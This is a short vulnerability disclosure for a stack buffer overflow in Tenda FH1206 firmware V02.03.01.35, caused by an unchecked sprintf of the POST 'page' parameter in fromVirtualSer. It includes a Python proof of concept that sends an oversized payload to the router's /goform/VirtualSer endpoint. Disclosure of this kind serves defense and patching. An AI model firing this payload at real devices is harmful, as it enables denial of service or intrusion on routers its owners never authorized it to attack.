## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 firmware has a stack overflow vulnerability located in the `fromVirtualSer` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v5, "nat_virtualser.asp?page=%s", v3);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v5` array, thus triggering this security vulnerability.

![image-20240409100526808](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409100526808.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/VirtualSer"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240801202321673](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)